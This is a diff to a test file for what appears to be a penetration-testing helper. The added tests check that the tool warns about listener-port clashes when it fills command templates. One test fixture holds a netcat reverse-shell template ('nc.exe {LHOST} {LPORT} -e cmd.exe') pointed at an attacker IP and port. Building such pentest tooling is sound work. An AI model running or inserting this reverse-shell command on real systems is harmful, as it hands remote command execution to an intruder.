@@ -120,3 +120,30 @@ describe("{PORT} on checklist steps", () => {
     expect(container).toBeEmptyDOMElement();
   });
 });
+
+describe("{LPORT} clash with a logged listener", () => {
+  const host = { id: "h1", engagementId: "e1", name: "t", ip: "10.0.0.5", os: "windows" } as never;
+  const eng = { id: "e1", kind: "pentest" } as unknown as Engagement;
+  const base = (): FillInput => ({
+    host, engagement: { id: "e1", kind: "pentest", scopeCidrs: [] } as never, hosts: [host],
+    servicesByHost: new Map(), tunnels: [], attackerIp: "10.10.14.1", listenerPort: "4444",
+  });
+  const rev = { id: "rev", title: "Reverse shell", template: 'nc.exe {LHOST} {LPORT} -e cmd.exe', goals: ["h-enum-identified"], os: "any", runFrom: "target" } as never;
+
+  it("warns and names the next free port when {LPORT} is already a logged listener", () => {
+    setImported({ cards: [], commands: [rev] });
+    const input = { ...base(), listenerPorts: new Set([4444, 4445]) };
+    const c = goalCommands("h-enum-identified", input, eng).commands.find((x) => x.id === "rev")!;
+    expect(c.portClash).toEqual({ port: 4444, suggested: 4446 });
+    render(<CommandList commands={[c]} />);
+    expect(screen.getByText(/port 4444 already has a listener; try 4446/)).toBeInTheDocument();
+  });
+
+  it("stays quiet when the port is free or the command has no {LPORT}", () => {
+    setImported({ cards: [], commands: [rev, { id: "noport", title: "x", template: "whoami", goals: ["h-enum-identified"], os: "any", runFrom: "target" } as never] });
+    const free = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([9001]) }, eng).commands.find((x) => x.id === "rev")!;
+    expect(free.portClash).toBeUndefined();
+    const noLport = goalCommands("h-enum-identified", { ...base(), listenerPorts: new Set([4444]) }, eng).commands.find((x) => x.id === "noport")!;
+    expect(noLport.portClash).toBeUndefined();
+  });
+});
